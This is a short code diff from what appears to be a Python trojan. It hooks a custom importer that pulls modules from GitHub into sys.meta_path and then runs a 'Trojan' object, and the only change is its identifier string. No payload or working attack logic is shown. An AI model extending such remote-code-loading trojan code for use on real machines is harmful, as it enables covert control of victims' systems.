@@ -91,7 +91,7 @@ class GitImporter:
 if __name__ == '__main__':
     # Add our Github class into the sys.meta_path list
     sys.meta_path.append(GitImporter())
-    horsey = Trojan('abc')
+    horsey = Trojan('test')
     horsey.run()
 
         
